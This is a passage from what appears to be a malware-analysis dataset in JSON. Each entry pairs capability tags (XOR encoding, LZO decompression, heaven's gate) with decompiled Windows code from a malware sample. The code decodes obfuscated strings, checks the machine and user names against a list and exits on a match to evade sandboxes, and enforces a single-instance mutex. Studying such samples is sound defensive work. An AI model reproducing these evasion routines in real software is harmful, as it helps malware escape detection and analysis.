0x43;\n    var_ch._1_1_ = 0x13;\n    var_ch._2_1_ = 10;\n    var_ch._3_1_ = 0x72;\n    var_84h = 0x30447278;\n    var_80h._0_1_ = 0x76;\n    uVar6 = (*pcVar3)(8, 0xd);\n    var_b4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar17 = 0;\n    var_74h = &var_14h - var_b4h;\n    do {\n        puVar1 = iVar17 + var_b4h;\n        iVar7 = iVar17 % var_78h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_84h + iVar7) ^ puVar1[&var_14h - var_b4h];\n    } while (iVar17 < 0xc);\n    iVar17 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, var_b4h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar17 == 0) {\n        fcn.0040a5e9();\n    }\n    var_10h._0_1_ = 0x1b;\n    var_10h._1_1_ = 6;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 0x2a;\n    var_ch._1_1_ = 0x20;\n    var_ch._2_1_ = 0x30;\n    var_ch._3_1_ = 0x67;\n    var_3ch = 0x4a4a6748;\n    var_38h._0_2_ = 0x4f48;\n    uVar6 = (*pcVar3)(8, 9);\n    var_84h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar17 = 0;\n    var_74h = &var_10h - var_84h;\n    do {\n        puVar1 = iVar17 + var_84h;\n        iVar7 = iVar17 % var_30h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_3ch + iVar7) ^ puVar1[&var_10h - var_84h];\n    } while (iVar17 < 8);\n    iVar17 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, var_84h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar17 == 0) {\n        fcn.0040a5e9();\n    }\n    pcbBuffer = 0x400;\n    var_1ch = 0x72097400;\n    var_18h = 0x740d611f;\n    var_14h._0_1_ = 0xf;\n    var_14h._1_1_ = 0x72;\n    var_14h._2_1_ = 0x18;\n    var_14h._3_1_ = 0x61;\n    var_10h._0_1_ = 0x16;\n    var_10h._1_1_ = 0x74;\n    var_10h._2_1_ = 0x17;\n    var_10h._3_1_ = 0x72;\n    var_ch._0_1_ = 0x71;\n    var_ch._1_1_ = 0x61;\n    var_3ch = 0x72787478;\n    var_38h._0_2_ = 0x6171;\n    uVar6 = (*pcVar3)(8, 0x25);\n    var_74h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar7 = 0;\n    iVar17 = var_74h;\n    do {\n        puVar1 = iVar7 + iVar17;\n        iVar17 = iVar7 % var_30h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_3ch + iVar17) ^ puVar1[&var_1ch - var_74h];\n        iVar17 = var_74h;\n    } while (iVar7 < 0x12);\n    iVar17 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41cdf0, &pcbBuffer);\n    if (iVar17 == 0) {\n        fcn.0040a5e9();\n    }\n    var_1ch = 0x45136f78;\n    var_18h = 0x6f783407;\n    var_14h._0_1_ = 0x1a;\n    var_14h._1_1_ = 0x45;\n    var_14h._2_1_ = 0x54;\n    var_14h._3_1_ = 0x34;\n    var_10h._0_1_ = 0x7f;\n    var_10h._1_1_ = 0x6f;\n    var_10h._2_1_ = 0x45;\n    var_10h._3_1_ = 0x45;\n    var_ch._0_1_ = 0x74;\n    var_ch._1_1_ = 0x34;\n    var_3ch = 0x45366f5a;\n    var_38h._0_2_ = 0x3474;\n    uVar6 = (*pcVar3)(8, 0x25);\n    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar17;\n        iVar8 = iVar7 % var_30h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_3ch + iVar8) ^ puVar1[&var_1ch - iVar17];\n    } while (iVar7 < 0x12);\n    var_10h._0_1_ = 0x1f;\n    var_10h._1_1_ = 7;\n    var_10h._2_1_ = 0x18;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x14;\n    var_ch._3_1_ = 0x46;\n    var_ach = 0x4d56464c;\n    var_a8h._0_2_ = 0x7876;\n    uVar6 = (*pcVar3)(8, 9);\n    var_3ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar7 = 0;\n    var_7ch = &var_10h - var_3ch;\n    do {\n        puVar1 = iVar7 + var_3ch;\n        iVar8 = iVar7 % var_30h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_ach + iVar8) ^ puVar1[&var_10h - var_3ch];\n    } while (iVar7 < 8);\n    iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, var_3ch);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 == 0) {\n        fcn.0040a5e9();\n    }\n    var_10h._0_1_ = 2;\n    var_10h._1_1_ = 0x38;\n    var_10h._2_1_ = 0x7a;\n    var_10h._3_1_ = 0x75;\n    var_ch._0_1_ = 0x60;\n    var_ch._1_1_ = 8;\n    var_ch._2_1_ = 0x74;\n    var_ch._3_1_ = 0x6b;\n    var_8h = 0x39336b35;\n    var_4h._0_2_ = 0x4136;\n    uVar6 = (*pcVar3)(8, 9);\n    var_ach = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar7 = 0;\n    var_7ch = &var_10h - var_ach;\n    do {\n        puVar1 = iVar7 + var_ach;\n        iVar8 = iVar7 % var_30h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_10h - var_ach];\n    } while (iVar7 < 8);\n    iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, var_ach);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 == 0) {\n        fcn.0040a5e9();\n    }\n    var_5ch = 0x2723761b;\n    var_58h = 0x72012865;\n    var_54h._0_1_ = 0x2d;\n    var_54h._1_1_ = 0x27;\n    var_54h._2_1_ = 0x77;\n    stack0xffffffab = 0x3865103a;\n    stack0xffffffaf = 0x1c206633;\n    stack0xffffffb3 = 0x4b302d79;\n    stack0xffffffb7 = 0x1c52271a;\n    var_44h._3_1_ = 99;\n    var_8h = 0x63713753;\n    var_4h._0_2_ = 0x6932;\n    uVar6 = (*pcVar3)(8, 0x1d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar8 = 0;\n    var_7ch = &var_5ch - iVar7;\n    do {\n        puVar1 = iVar8 + iVar7;\n        iVar9 = iVar8 % var_30h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_5ch - iVar7];\n    } while (iVar8 < 0x1c);\n    var_1ch = 0x4c192a3c;\n    var_18h = 0x3110221;\n    var_14h._0_1_ = 0x57;\n    var_14h._1_1_ = 0x37;\n    var_14h._2_1_ = 0x39;\n    var_14h._3_1_ = 0x36;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x4b;\n    var_10h._2_1_ = 0x2d;\n    var_10h._3_1_ = 0;\n    var_ch._0_1_ = 0x3d;\n    var_ch._1_1_ = 0x6a;\n    var_8h = 0x386a536f;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x44);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    var_7ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar8 = 0;\n    var_bch = &var_1ch - var_7ch;\n    do {\n        puVar1 = iVar8 + var_7ch;\n        iVar9 = iVar8 % var_78h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[var_bch];\n    } while (iVar8 < 0x12);\n    cVar4 = fcn.0040a58d(var_7ch, var_7ch);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar4 == '\\0') {\n        fcn.0040a5e9();\n    }\n    var_8h = 0x793e0e0b;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4d);\n    var_28h = 0x5977434a;\n    var_24h._0_2_ = 0x664d;\n    uVar6 = (*pcVar3)(8, 6);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iVar8;\n        iVar10 = iVar9 % var_30h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_28h + iVar10) ^ puVar1[&var_8h - iVar8];\n    } while (iVar9 < 5);\n    var_8h = 0x7a26292c;\n    var_4h._0_2_ = 0x7801;\n    var_28h = 0x3265666e;\n    var_24h._0_2_ = 0x7852;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar10 = 0;\n    do {\n        puVar1 = iVar10 + iVar9;\n        iVar11 = iVar10 % 6;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_28h + iVar11) ^ puVar1[&var_8h - iVar9];\n    } while (iVar10 < 6);\n    var_8h = 0x2e1c2520;\n    var_4h._0_1_ = 0x72;\n    var_28h = 0x76536776;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x72);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar11 = 0;\n    do {\n        puVar1 = iVar11 + iVar10;\n        iVar12 = iVar11 % 5;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_28h + iVar12) ^ puVar1[&var_8h - iVar10];\n    } while (iVar11 < 5);\n    var_8h = 0x67d1d3e;\n    var_4h._0_1_ = 0x72;\n    var_28h = 0x5330586f;\n    var_24h._0_2_ = 0x6f72;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar12 = 0;\n    do {\n        puVar1 = iVar12 + iVar11;\n        iVar13 = iVar12 % var_30h;\n        iVar12 = iVar12 + 1;\n        *puVar1 = *(&var_28h + iVar13) ^ puVar1[&var_8h - iVar11];\n    } while (iVar12 < 5);\n    var_8h = 0xa0b2336;\n    var_4h._0_1_ = 0x6a;\n    var_28h = 0x43486e65;\n    var_24h._0_2_ = 0x566a;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    do {\n        puVar1 = iVar13 + iVar12;\n        iVar14 = iVar13 % var_30h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_28h + iVar14) ^ puVar1[&var_8h - iVar12];\n    } while (iVar13 < 5);\n    var_1ch = 0x1673e2c;\n    var_18h = 0x1e504528;\n    var_14h._0_1_ = 100;\n    var_14h._1_1_ = 0x52;\n    var_14h._2_1_ = 0x55;\n    var_14h._3_1_ = 0x44;\n    var_10h._0_1_ = 3;\n    var_10h._1_1_ = 0x74;\n    var_10h._2_1_ = 0x54;\n    var_10h._3_1_ = 0x55;\n    var_ch._0_1_ = 0x70;\n    var_8h = 0x44337065;\n    var_4h._0_1_ = 100;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    var_bch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    var_b8h = &var_1ch - var_bch;\n    do {\n        puVar1 = iVar13 + var_bch;\n        iVar14 = iVar13 % var_78h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_8h + iVar14) ^ puVar1[var_b8h];\n    } while (iVar13 < 0x11);\n    var_10h._0_1_ = 0x11;\n    var_10h._1_1_ = 0xd;\n    var_10h._2_1_ = 0x16;\n    var_10h._3_1_ = 2;\n    var_ch._0_1_ = 0x75;\n    var_ch._1_1_ = 0x66;\n    var_ch._2_1_ = 0x59;\n    var_8h = 0x56585957;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x58);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    var_b8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    var_34h = &var_10h - var_b8h;\n    do {\n        puVar1 = iVar13 + var_b8h;\n        iVar14 = iVar13 % var_78h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_8h + iVar14) ^ puVar1[&var_10h - var_b8h];\n    } while (iVar13 < 7);\n    var_28h = 0x2a09193d;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x4b);\n    var_70h = 0x6347566e;\n    var_6ch._0_1_ = 0x4b;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    *0x41d220 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    var_8h = *0x41d220;\n    iVar13 = 0;\n    var_34h = &var_28h - *0x41d220;\n    do {\n        puVar1 = iVar13 + *0x41d220;\n        iVar14 = iVar13 % var_78h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_70h + iVar14) ^ puVar1[&var_28h - *0x41d220];\n    } while (iVar13 < 5);\n    *0x41d21c = var_b8h;\n    uVar16 = 0;\n    *0x41d218 = var_bch;\n    *0x41d200 = iVar8;\n    *0x41d208 = iVar9;\n    *0x41d20c = iVar10;\n    *0x41d210 = iVar11;\n    *0x41d214 = iVar12;\n    do {\n        iVar13 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, *(uVar16 + 0x41d200));\n        if (iVar13 != 0) {\n            fcn.0040a5e9();\n        }\n        uVar16 = uVar16 + 4;\n    } while (uVar16 < 0x20);\n    var_14h._1_1_ = 5;\n    var_1ch = 0x30320035;\n    var_18h = 0x3900213c;\n    var_14h._0_1_ = 0x26;\n    var_14h._2_1_ = 6;\n    var_14h._3_1_ = 0x1b;\n    var_10h._0_1_ = 0x25;\n    var_10h._1_1_ = 0x3c;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0xd;\n    var_ch._0_1_ = 0x69;\n    var_70h = 0x55566963;\n    var_6ch._0_1_ = 0x53;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    var_28h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    var_34h = &var_1ch - var_28h;\n    do {\n        puVar1 = iVar13 + var_28h;\n        iVar14 = iVar13 % var_78h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_70h + iVar14) ^ puVar1[&var_1ch - var_28h];\n    } while (iVar13 < 0x11);\n    cVar4 = fcn.0040a58d(var_28h, var_28h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar4 == '\\0') {\n        fcn.0040a5e9();\n    }\n    var_14h._0_1_ = 0x3a;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_1_ = 0x44;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x44;\n    var_10h._1_1_ = 0x18;\n    var_10h._2_1_ = 0;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 0x59;\n    var_ch._1_1_ = 0xe;\n    var_ch._2_1_ = 0x31;\n    var_a4h = 0x7636626c;\n    var_a0h._0_2_ = 0x7931;\n    uVar6 = (*pcVar3)(8, 0xc);\n    var_70h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    var_34h = &var_14h - var_70h;\n    do {\n        puVar1 = iVar13 + var_70h;\n        iVar14 = iVar13 % var_30h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_a4h + iVar14) ^ puVar1[&var_14h - var_70h];\n    } while (iVar13 < 0xb);\n    iVar13 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, var_70h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar13 != 0) {\n        fcn.0040a5e9();\n    }\n    var_68h = 0x67280e15;\n    var_64h = 0x4142560;\n    var_60h = 0x75e7e32;\n    var_5ch = 0x5c1d2e34;\n    var_58h = 0x161a1051;\n    var_54h._0_1_ = 7;\n    var_54h._1_1_ = 0x5d;\n    var_54h._2_1_ = 0x53;\n    stack0xffffffab = 0x3232310b;\n    stack0xffffffaf = 0x34164270;\n    stack0xffffffb3 = 0x61470024;\n    stack0xffffffb7 = 0x7323401;\n    var_44h._3_1_ = 0x5c;\n    var_40h._0_2_ = 0x6459;\n    var_9ch = 0x336e4146;\n    var_98h._0_2_ = 0x6437;\n    uVar6 = (*pcVar3)(8, 0x2b);\n    var_a4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    var_34h = &var_68h - var_a4h;\n    do {\n        puVar1 = iVar13 + var_a4h;\n        iVar14 = iVar13 % var_30h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_9ch + iVar14) ^ puVar1[&var_68h - var_a4h];\n    } while (iVar13 < 0x2a);\n    cVar4 = fcn.0040a58d(var_a4h, var_a4h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar4 == '\\0') {\n        fcn.0040a5e9();\n    }\n    var_20h = 0x43795b4d;\n    var_1ch = 0x5a4e4e42;\n    var_18h = 0x5544597b;\n    var_14h._0_1_ = 0x4f;\n    var_14h._1_1_ = 0x5d;\n    var_14h._2_1_ = 0x7b;\n    var_14h._3_1_ = 0x42;\n    var_10h._0_1_ = 0x42;\n    var_10h._1_1_ = 0x4e;\n    var_10h._2_1_ = 0x4a;\n    var_10h._3_1_ = 0x5d;\n    var_ch._0_1_ = 0x72;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 0x46;\n    var_ch._3_1_ = 99;\n    var_94h = 0x744b6e78;\n    var_90h._0_2_ = 0x6376;\n    uVar6 = (*pcVar3)(8, 0x19);\n    var_9ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    var_34h = &var_20h - var_9ch;\n    do {\n        puVar1 = iVar13 + var_9ch;\n        iVar14 = iVar13 % var_30h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_94h + iVar14) ^ puVar1[&var_20h - var_9ch];\n    } while (iVar13 < 0x18);\n    iVar13 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, var_9ch);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar13 != 0) {\n        fcn.0040a5e9();\n    }\n    var_58h = 0x6e005164;\n    var_54h._0_1_ = 0x70;\n    var_54h._1_1_ = 0x4c;\n    var_54h._2_1_ = 0x65;\n    stack0xffffffab = 0x747b0053;\n    stack0xffffffaf = 0x4506450;\n    stack0xffffffb3 = 0x614c7065;\n    stack0xffffffb7 = 0x77670154;\n    var_44h._3_1_ = 0x61;\n    var_10h._0_1_ = 0x53;\n    var_10h._1_1_ = 0x67;\n    var_10h._2_1_ = 0x34;\n    var_10h._3_1_ = 0x56;\n    var_ch._0_1_ = 0x47;\n    var_ch._1_1_ = 0x61;\n    uVar6 = (*pcVar3)(8, 0x19);\n    var_94h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    var_34h = &var_58h - var_94h;\n    do {\n        puVar1 = iVar13 + var_94h;\n        iVar14 = iVar13 % var_30h;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_10h + iVar14) ^ puVar1[&var_58h - var_94h];\n    } while (iVar13 < 0x18);\n    iVar13 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, var_94h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar13 != 0) {\n        fcn.0040a5e9();\n    }\n    var_54h._2_1_ = 5;\n    var_58h = 0x600d0005;\n    var_54h._0_1_ = 0x51;\n    var_54h._1_1_ = 0x1f;\n    stack0xffffffab = 0xa4b6f0a;\n    stack0xffffffaf = 0x5f610b02;\n    stack0xffffffb3 = 0x6a140307;\n    stack0xffffffb7 = 0xd070454;\n    var_44h._3_1_ = 0x58;\n    var_30h = 0x58393632;\n    var_2ch._0_1_ = 0x66;\n    uVar6 = (*pcVar3)(8, 0x19);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar14 = 0;\n    var_34h = &var_58h - iVar13;\n    do {\n        puVar1 = iVar14 + iVar13;\n        iVar15 = iVar14 % var_78h;\n        iVar14 = iVar14 + 1;\n        *puVar1 = *(&var_30h + iVar15) ^ puVar1[&var_58h - iVar13];\n    } while (iVar14 < 0x18);\n    iVar15 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar13);\n    iVar14 = var_94h;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar15 != 0) {\n        fcn.0040a5e9();\n    }\n    uVar6 = (*pcVar3)(0, iVar13);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar14);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_9ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_a4h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_70h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_28h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_8h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_b8h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_bch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar12);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar11);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar10);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar9);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar8);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_7ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar7);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_ach);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_3ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar17);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_74h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_84h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_b4h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_8ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar5);\n    uVar16 = (*pcVar2)(uVar6);\n    return uVar16 & 0xffffff00;\n}\n",
        "token_count": 9726
    },
    "0040b18e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0040b18e(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    uVar2 = 0;\n    if (arg_ch != 4) {\n        do {\n            iVar3 = 4;\n            pcVar1 = \"DDDD\\x01\";\n            do {\n                iVar3 = iVar3 + -1;\n                if (pcVar1[arg_8h + -0x41ca94 + uVar2] != *pcVar1) {\n                    iVar3 = pcVar1[arg_8h + -0x41ca94 + uVar2] - *pcVar1;\n                    break;\n                }\n                pcVar1 = pcVar1 + 1;\n            } while (iVar3 != 0);\n            if (iVar3 == 0) {\n                return uVar2 + arg_8h;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch - 4U);\n    }\n    return 0;\n}\n",
        "token_count": 270
    },
    "0040f9a0": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040f9a0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.0040f9f5(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 189
    },
    "004017a5": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004017a5(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_3ch = 0x68504e37;\n    var_38h = 0x4e124643;\n    var_34h = 0x4652685c;\n    var_30h = 0x68704e01;\n    var_2ch = 0x4e10465f;\n    var_28h = 0x46486847;\n    var_24h = 0x685a4e34;\n    var_20h = 0x4e0a4658;\n    var_1ch = 0x46656841;\n    var_18h = 0x68474e0c;\n    var_14h = 0x4e054654;\n    var_10h = 0x46316851;\n    var_ch = 0x68354e64;\n    var_8h._0_2_ = 0x4631;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        var_4h = 6;\n        puVar1 = iVar5 + iVar3;\n        iVar4 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_ch + iVar4) ^ puVar1[&var_3ch - iVar3];\n    } while (iVar5 < 0x30);\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar3);\n    if (iVar5 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar3);\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 642
    },
    "00402f5a": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.00402f5a(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    uint var_48h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uchar *var_13h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_48h._0_1_ = 0x38;\n    stack0xffffffb5 = 0x1b755358;\n    var_43h = 0x10313c59;\n    var_3fh = 0x56583f78;\n    var_3bh = 0x31591075;\n    var_37h = 0x32781f31;\n    var_33h = 0x15755d58;\n    var_2fh._0_2_ = 0x3659;\n    var_2fh._2_1_ = 0x31;\n    var_2fh._3_1_ = 0x1a;\n    var_2bh = 0x40582978;\n    var_27h = 0x2b590a75;\n    var_23h = 0x2c780131;\n    var_1fh = 0xf754758;\n    var_1bh = 0xc312059;\n    var_17h = 0x31582378;\n    var_13h._0_1_ = 0x75;\n    stack0xffffffec = 0x75315859;\n    var_ch._0_1_ = 0x78;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_8h = &var_48h - iVar5;\n    do {\n        var_4h = 0x5;\n        puVar1 = iVar9 + iVar5;\n        iVar8 = iVar9 % 5;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_13h + iVar8 + 3) ^ puVar1[&var_48h - iVar5];\n    } while (iVar9 < 0x36);\n    uVar6 = fcn.00402e2f();\n    puVar7 = uVar6 % 0x38 + 8;\n    unique0x10000104 = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar4 = (*pcVar2)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        puVar3 = stack0xffffffec;\n        